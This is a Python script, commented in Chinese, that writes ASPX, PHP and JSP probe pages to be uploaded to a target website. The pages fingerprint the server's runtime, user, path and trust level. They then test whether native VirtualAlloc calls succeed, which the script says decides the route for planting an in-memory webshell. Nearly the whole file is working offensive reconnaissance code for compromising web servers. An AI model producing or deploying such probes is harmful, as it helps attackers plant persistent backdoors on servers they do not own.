#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""probe.py —— 生成"环境探测页"，判定目标站点该走哪条内存马路线
三条路线各有前置条件，探不出就是白折腾：
  ASPX(w3wp/.NET) : 无需额外条件（只要 IIS 装了 ASP.NET）
  PHP (php-cgi)   : 需 PHP 扩展 FFI 且 ffi.enable=1
  JSP (Tomcat)    : 需 classpath 有 JNA(com.sun.jna)
三个探测页都会**实际试调一次 VirtualAlloc**，返回 ok/fail/异常 —— 比只看配置可靠。
用法: python probe.py --all     /    --aspx / --php / --jsp
"""
import argparse
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))

A = r'''<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool VirtualFree(IntPtr a, uint s, uint f);
    void Page_Load(object sender, EventArgs e) {
        Response.ContentType = "text/plain";
        Response.Write("route=aspx\n");
        Response.Write("clr=" + Environment.Version + "\n");
        Response.Write("proc=" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + "\n");
        Response.Write("arch=" + (IntPtr.Size == 8 ? "x64" : "x86") + "\n");
        Response.Write("user=" + Environment.UserName + "\n");
        Response.Write("sitepath=" + Request.PhysicalApplicationPath + "\n");
        Response.Write("fulltrust=" + AppDomain.CurrentDomain.IsFullyTrusted + "\n");
        try {
            IntPtr m = VirtualAlloc(IntPtr.Zero, 16, 0x3000, 0x04);
            Response.Write("pinvoke=" + (m != IntPtr.Zero ? "ok" : "fail") + "\n");
            if (m != IntPtr.Zero) VirtualFree(m, 0, 0x8000);
        } catch (Exception ex) { Response.Write("pinvoke=exception:" + ex.GetType().Name + "\n"); }
        Response.Write("verdict=" + (AppDomain.CurrentDomain.IsFullyTrusted ? "ASPX 路线可用" : "信任级别受限，P/Invoke 可能被拒") + "\n");
    }
</script>
<html><body>probe</body></html>
'''

P = r'''<?php
header('Content-Type: text/plain');
echo "route=php\n";
echo "php=" . PHP_VERSION . "\n";
echo "sapi=" . php_sapi_name() . "\n";
echo "os=" . PHP_OS . " " . php_uname('m') . "\n";
echo "user=" . get_current_user() . "\n";
echo "ffi_class=" . (class_exists('FFI') ? 'yes' : 'no') . "\n";
echo "ffi_enable=" . ini_get('ffi.enable') . "\n";
if (class_exists('FFI')) {
    try {
        $f = FFI::cdef("void* VirtualAlloc(void*, size_t, unsigned long, unsigned long);", "kernel32.dll");
        $m = $f->VirtualAlloc(null, 16, 0x3000, 0x04);
        echo "pinvoke=" . ($m ? "ok" : "fail") . "\n";
    } catch (Throwable $t) { echo "pinvoke=exception:" . $t->getMessage() . "\n"; }
} else { echo "pinvoke=skip\n"; }
echo "verdict=" . (class_exists('FFI') ? "PHP 路线可用（pinvoke=ok 时）" : "PHP 路线不可用：需 php.ini 开 extension=ffi 与 ffi.enable=1 并重启") . "\n";
'''

J = r'''<%@ page language="java" import="java.lang.management.*" pageEncoding="UTF-8" %>
<%
    response.setContentType("text/plain");
    out.println("route=jsp");
    out.println("java=" + System.getProperty("java.version"));
    out.println("os=" + System.getProperty("os.name") + " " + System.getProperty("os.arch"));
    out.println("proc=" + ManagementFactory.getRuntimeMXBean().getName());
    out.println("user=" + System.getProperty("user.name"));
    boolean hasJna = false;
    try { Class.forName("com.sun.jna.Native"); hasJna = true; } catch (Throwable t) { hasJna = false; }
    out.println("jna=" + (hasJna ? "yes" : "no"));
    if (hasJna) {
        try {
            com.sun.jna.NativeLibrary k = com.sun.jna.NativeLibrary.getInstance("kernel32");
            com.sun.jna.Function va = k.getFunction("VirtualAlloc");
            com.sun.jna.Pointer p = va.invokePointer(new Object[]{ null, 16, 0x3000, 0x04 });
            out.println("pinvoke=" + (p != null ? "ok" : "fail"));
        } catch (Throwable t) { out.println("pinvoke=exception:" + t); }
    } else { out.println("pinvoke=skip"); }
    out.println("verdict=" + (hasJna ? "JSP 路线可用（pinvoke=ok 时）" : "JSP 路线不可用：把 jna.jar 放进 WEB-INF/lib 再重启应用"));
%>
'''


def main():
    ap = argparse.ArgumentParser()
    for k in ("aspx", "php", "jsp"):
        ap.add_argument("--" + k, action="store_true")
    ap.add_argument("--all", action="store_true")
    ap.add_argument("--outdir", default=HERE)
    a = ap.parse_args()
    todo = []
    if a.all or a.aspx:
        todo.append(("probe.aspx", A, "\r\n"))
    if a.all or a.php:
        todo.append(("probe.php", P, "\n"))
    if a.all or a.jsp:
        todo.append(("probe.jsp", J, "\n"))
    if not todo:
        print("请指定 --aspx / --php / --jsp / --all")
        return 1
    for name, text, nl in todo:
        p = os.path.join(a.outdir, name)
        open(p, "w", encoding="utf-8", newline=nl).write(text)
        print("[+] %s (%d 字节)" % (p, os.path.getsize(p)))
    print("\n上传到网站目录后用浏览器访问，看 route / pinvoke / verdict 三行即可定路线")
    return 0


if __name__ == "__main__":
    sys.exit(main())
